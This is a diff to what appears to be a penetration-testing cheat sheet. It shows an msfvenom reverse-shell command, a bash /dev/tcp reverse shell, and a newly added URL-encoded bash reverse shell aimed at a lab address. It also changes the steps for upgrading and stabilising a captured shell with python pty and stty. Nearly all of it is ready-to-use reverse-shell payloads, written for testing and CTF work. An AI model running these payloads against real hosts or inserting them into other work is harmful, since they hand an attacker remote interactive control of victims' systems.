@@ -34,12 +34,20 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -v shellcode -f 
 bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
 ```
 
+``` bash
+bash+-i+%3e%26+%2fdev%2ftcp%2f192.168.56.110%252f4444+0%3e%261
+```
+
 ## Upgrade shell
 
 ``` bash
-/usr/bin/python -c "import pty; pty.spawn('/bin/sh')"
+/usr/bin/python -c "import pty; pty.spawn('/bin/bash')"
 export TERM=xterm
+```
 
+^Z
+
+``` bash
 stty raw -echo
 fg
 ```
